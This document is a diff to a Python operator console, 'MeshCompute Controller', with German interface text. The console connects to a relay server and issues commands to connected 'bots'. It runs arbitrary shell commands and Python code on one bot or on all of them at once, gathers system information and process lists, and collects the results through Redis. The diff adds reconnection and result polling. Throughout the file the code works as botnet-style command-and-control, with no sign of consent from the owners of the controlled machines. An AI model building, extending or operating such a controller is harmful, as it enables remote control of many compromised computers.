@@ -3,205 +3,198 @@ import websockets
 import json
 import time
 import logging
+import redis.asyncio as redis
 from colorama import init, Fore, Style
 from dotenv import load_dotenv
-from common.config import SERVER_URL, AUTH_TOKEN
+from common.config import SERVER_URL, AUTH_TOKEN, REDIS_URL
 
 load_dotenv()
 init(autoreset=True)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-INTRO = f"""{Fore.CYAN}
-=====================================
-      MeshCompute Controller v2 (Redis)
-=====================================
-Befehle: list | exec <bot|all> <cmd> | sysinfo <bot|all>
-         python <bot|all> <code> | ps <bot|all> | ping <bot|all> | exit
-====================================={Style.RESET_ALL}
-"""
 PROMPT = f"\n{Fore.GREEN}meshctrl > {Style.RESET_ALL}"
 
 
 class MeshController:
     def __init__(self):
         self.ws = None
+        self.redis = None
         self.connected = False
         self.task_counter = 0
 
+    async def get_redis(self):
+        if not self.redis:
+            self.redis = redis.from_url(REDIS_URL, decode_responses=True)
+        return self.redis
+
     def next_task_id(self) -> str:
         self.task_counter += 1
-        return str(self.task_counter)
+        return f"task_{int(time.time())}_{self.task_counter}"
 
     async def connect(self):
-        try:
-            self.ws = await websockets.connect(SERVER_URL)
-            await self.ws.send(json.dumps({
-                "type": "controller",
-                "auth_token": AUTH_TOKEN
-            }))
-            self.connected = True
-            print(f"{Fore.GREEN}[+] Erfolgreich mit dem Server verbunden{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
-            self.connected = False
+        """Verbindung mit Reconnect-Versuch"""
+        while True:
+            try:
+                self.ws = await websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=30)
+                await self.ws.send(json.dumps({
+                    "type": "controller",
+                    "auth_token": AUTH_TOKEN
+                }))
+                self.connected = True
+                print(f"{Fore.GREEN}[+] Erfolgreich mit dem Relay-Server verbunden{Style.RESET_ALL}")
+                return True
+            except Exception as e:
+                print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
+                await asyncio.sleep(3)
 
-    async def send_command(self, command: dict, wait_result: bool = True):
-        """Sendet einen Befehl und empfängt die Antwort direkt (kein Background-Task)."""
-        if not self.connected:
-            print(f"{Fore.RED}Nicht verbunden.{Style.RESET_ALL}")
+    async def wait_for_result(self, task_id: str, timeout: int = 40):
+        """Stabiles Warten auf Ergebnis über Redis"""
+        r = await self.get_redis()
+        result_key = f"mesh:results:{task_id}"
+
+        print(f"{Fore.CYAN}Warte auf Ergebnis (max {timeout}s)...{Style.RESET_ALL}")
+
+        try:
+            # blpop ist blockierend und effizient
+            result = await asyncio.wait_for(
+                r.blpop(result_key, timeout=timeout),
+                timeout=timeout + 2
+            )
+
+            if result:
+                _, result_raw = result
+                data = json.loads(result_raw)
+                self._print_result(data)
+                # Cleanup
+                await r.delete(result_key)
+                return data
+
+        except asyncio.TimeoutError:
+            print(f"{Fore.RED}Timeout: Kein Ergebnis innerhalb von {timeout} Sekunden.{Style.RESET_ALL}")
+        except Exception as e:
+            logger.error(f"Fehler beim Result-Fetch: {e}")
+            print(f"{Fore.RED}Fehler beim Abrufen des Ergebnisses.{Style.RESET_ALL}")
+
+    async def send_command(self, action: str, target: str = "all", payload: str = None):
+        if not self.connected or not self.ws:
+            print(f"{Fore.RED}Nicht verbunden. Versuche neu zu verbinden...{Style.RESET_ALL}")
+            await self.connect()
             return
+
+        task_id = self.next_task_id()
+
+        command = {
+            "type": "command",
+            "task_id": task_id,
+            "action": action,
+            "target": target,
+            "payload": payload
+        }
+
         try:
             await self.ws.send(json.dumps(command))
 
-            # Antwort vom Server lesen (info: "Task queued" oder direkt result bei list)
-            response_raw = await asyncio.wait_for(self.ws.recv(), timeout=5)
+            # Sofortige Server-Bestätigung
+            response_raw = await asyncio.wait_for(self.ws.recv(), timeout=8)
             response = json.loads(response_raw)
+            self._print_result(response)
 
-            # Bei list kommt das Ergebnis direkt
-            if response.get("type") == "result":
-                self._print_result(response)
+            # Bei list kein Result-Warten nötig
+            if action == "list":
                 return
 
-            # FIX: get_result nur für Aktionen die Tasks erzeugen (nicht für list)
-            if wait_result and command.get("action") != "list":
-                task_id = command.get("task_id")
-                await self.ws.send(json.dumps({
-                    "type": "get_result",
-                    "task_id": task_id
-                }))
-                result_raw = await asyncio.wait_for(self.ws.recv(), timeout=35)
-                result = json.loads(result_raw)
-                self._print_result(result)
+            # Bei allen anderen Aktionen auf echtes Result warten
+            await self.wait_for_result(task_id)
 
         except asyncio.TimeoutError:
-            print(f"{Fore.RED}Timeout – keine Antwort vom Server.{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
+            print(f"{Fore.RED}Timeout beim Senden/Empfangen.{Style.RESET_ALL}")
+        except websockets.exceptions.ConnectionClosed:
+            print(f"{Fore.RED}Verbindung zum Server verloren.{Style.RESET_ALL}")
             self.connected = False
+        except Exception as e:
+            logger.error(f"Fehler beim Senden: {e}")
+            print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
 
     def _print_result(self, data: dict):
-        """Gibt ein Ergebnis formatiert aus."""
-        msg_type = data.get("type")
-
-        if msg_type == "error":
-            print(f"{Fore.RED}Fehler: {data.get('message')}{Style.RESET_ALL}")
+        """Verbesserte Ausgabe"""
+        if not data:
             return
 
-        if msg_type == "info":
+        if data.get("type") == "info":
             print(f"{Fore.BLUE}{data.get('message')}{Style.RESET_ALL}")
             return
 
-        # Botliste
-        if "bots" in data.get("data", {}):
-            bots = data["data"]["bots"]
-            print(f"\n{Fore.CYAN}=== Verbundene Bots ({data['data']['count']}) ==={Style.RESET_ALL}")
-            if not bots:
-                print("  (keine Bots online)")
+        if data.get("type") == "result" and "data" in data:
+            # list-Befehl
+            bots = data["data"].get("bots", [])
+            print(f"\n{Fore.CYAN}=== Verbundene Bots ({len(bots)}) ==={Style.RESET_ALL}")
             for bot in bots:
-                color = Fore.GREEN if bot["status"] == "online" else Fore.RED
+                color = Fore.GREEN if bot.get("status") == "online" else Fore.YELLOW
                 print(f"  {color}{bot['bot_id']}{Style.RESET_ALL} | "
-                      f"{bot['hostname']} | "
-                      f"Zuletzt gesehen: {bot['last_seen_sec']}s")
+                      f"{bot.get('hostname', 'n/a')} | "
+                      f"{bot.get('last_seen_sec', 0)}s ago")
             return
 
-        # Task-Ergebnis
+        # Normale Task-Ergebnisse
         bot_id = data.get("bot_id", "Unknown")
-        print(f"\n{Fore.YELLOW}=== Ausgabe von {bot_id} ==={Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}=== Ergebnis von {bot_id} ==={Style.RESET_ALL}")
 
         if data.get("info"):
             print(f"{Fore.CYAN}System Information:{Style.RESET_ALL}")
-            for key, value in data["info"].items():
-                if key != "bot_id":
-                    print(f"  {key:12}: {value}")
+            for k, v in data["info"].items():
+                if k != "bot_id":
+                    print(f"  {k:15}: {v}")
         elif data.get("processes"):
-            print(f"{Fore.CYAN}Prozesse:{Style.RESET_ALL}")
-            for p in data["processes"][:20]:
-                print(f"  {p['pid']:6}  {p['name'][:35]:35}  CPU: {p.get('cpu', 0):.1f}%")
-        elif data.get("output") is not None:
-            output = data["output"].strip()
-            print(output if output else "(keine Ausgabe)")
-            if data.get("error"):
-                print(f"{Fore.RED}stderr: {data['error'].strip()}{Style.RESET_ALL}")
-        elif data.get("success") is not None:
-            if data["success"]:
-                print(f"{Fore.GREEN}Erfolg: {data.get('message', 'OK')}{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}Top Prozesse:{Style.RESET_ALL}")
+            for p in data["processes"][:15]:
+                print(f"  {p['pid']:6} {p['name'][:30]:30} CPU: {p.get('cpu', 0):.1f}%")
+        elif data.get("output") is not None or data.get("success") is not None:
+            if data.get("success"):
+                print(f"{Fore.GREEN}Erfolg{Style.RESET_ALL}")
             else:
-                print(f"{Fore.RED}Fehler: {data.get('error', 'Unbekannt')}{Style.RESET_ALL}")
+                print(f"{Fore.RED}Fehlgeschlagen{Style.RESET_ALL}")
+
+            if data.get("output"):
+                print(data["output"].strip())
+            if data.get("error"):
+                print(f"{Fore.RED}Error: {data['error']}{Style.RESET_ALL}")
         else:
             print(json.dumps(data, indent=2, ensure_ascii=False))
 
-    # FIX: Alle Befehle sind async und werden direkt awaitet – kein asyncio.create_task
     async def handle_command(self, line: str):
         line = line.strip()
         if not line:
             return
 
-        parts = line.split(None, 1)
+        parts = line.split(maxsplit=2)
         cmd = parts[0].lower()
-        arg = parts[1] if len(parts) > 1 else ""
 
         if cmd == "list":
-            await self.send_command({
-                "type": "command",
-                "action": "list",
-                "task_id": self.next_task_id()
-            }, wait_result=False)
+            await self.send_command("list")
 
-        elif cmd == "exec":
-            parts2 = arg.split(None, 1)
-            if len(parts2) < 2:
-                print("Verwendung: exec <bot_id|all> <befehl>")
-                return
-            target, cmd_text = parts2
-            await self.send_command({
-                "type": "command",
-                "action": "exec",
-                "target": target,
-                "payload": cmd_text,
-                "task_id": self.next_task_id()
-            })
+        elif cmd == "exec" and len(parts) >= 3:
+            target = parts[1]
+            payload = parts[2]
+            await self.send_command("exec", target, payload)
 
         elif cmd == "sysinfo":
-            target = arg.strip() or "all"
-            await self.send_command({
-                "type": "command",
-                "action": "sysinfo",
-                "target": target,
-                "task_id": self.next_task_id()
-            })
+            target = parts[1] if len(parts) > 1 else "all"
+            await self.send_command("sysinfo", target)
 
-        elif cmd == "python":
-            parts2 = arg.split(None, 1)
-            if len(parts2) < 2:
-                print("Verwendung: python <bot_id|all> <code>")
-                return
-            target, code = parts2
-            await self.send_command({
-                "type": "command",
-                "action": "python",
-                "target": target,
-                "payload": code,
-                "task_id": self.next_task_id()
-            })
+        elif cmd == "python" and len(parts) >= 3:
+            target = parts[1]
+            payload = parts[2]
+            await self.send_command("python", target, payload)
 
         elif cmd == "ps":
-            target = arg.strip() or "all"
-            await self.send_command({
-                "type": "command",
-                "action": "ps",
-                "target": target,
-                "task_id": self.next_task_id()
-            })
+            target = parts[1] if len(parts) > 1 else "all"
+            await self.send_command("ps", target)
 
         elif cmd == "ping":
-            target = arg.strip() or "all"
-            await self.send_command({
-                "type": "command",
-                "action": "ping",
-                "target": target,
-                "task_id": self.next_task_id()
-            })
+            target = parts[1] if len(parts) > 1 else "all"
+            await self.send_command("ping", target)
 
         elif cmd in ("exit", "quit"):
             print(f"{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
@@ -209,44 +202,35 @@ class MeshController:
                 await self.ws.close()
             raise SystemExit
 
-        elif cmd in ("clear", "cls"):
-            print("\033c", end="")
-
         elif cmd == "help":
-            print(f"""
-{Fore.CYAN}Verfügbare Befehle:{Style.RESET_ALL}
-  list                        – Alle Bots anzeigen
-  exec  <bot|all> <befehl>   – Shell-Befehl ausführen
-  sysinfo <bot|all>           – Systeminfo abrufen
-  python  <bot|all> <code>    – Python-Code ausführen
-  ps      <bot|all>           – Prozessliste
-  ping    <bot|all>           – Ping
-  exit                        – Beenden
+            print("""\nVerfügbare Befehle:
+  list                        → Alle Bots anzeigen
+  exec  <bot|all> <befehl>    → Shell-Befehl
+  sysinfo <bot|all>           → Systeminfo
+  python <bot|all> <code>     → Python Code
+  ps    <bot|all>             → Prozesse
+  ping  <bot|all>             → Ping
+  help | exit
 """)
         else:
-            print(f"{Fore.RED}Unbekannter Befehl: {cmd}. Tippe 'help' für Hilfe.{Style.RESET_ALL}")
+            print(f"{Fore.RED}Unbekannter Befehl. Tippe 'help'{Style.RESET_ALL}")
 
 
 async def main():
-    print(INTRO)
     controller = MeshController()
     await controller.connect()
 
-    if not controller.connected:
-        return
-
     while True:
         try:
-            # Input in Executor, damit asyncio nicht blockiert
             cmd_input = await asyncio.get_event_loop().run_in_executor(None, input, PROMPT)
             await controller.handle_command(cmd_input)
         except (KeyboardInterrupt, SystemExit):
-            print(f"\n{Fore.YELLOW}Beendet.{Style.RESET_ALL}")
             break
         except Exception as e:
-            print(f"Fehler: {e}")
+            logger.error(f"Hauptloop Fehler: {e}")
+            await asyncio.sleep(1)
 
 
 if __name__ == "__main__":
-    print(f"{Fore.MAGENTA}MeshCompute Controller wird gestartet...{Style.RESET_ALL}")
+    print(f"{Fore.MAGENTA}MeshCompute Controller v2.1 (stabilisiert){Style.RESET_ALL}")
     asyncio.run(main())
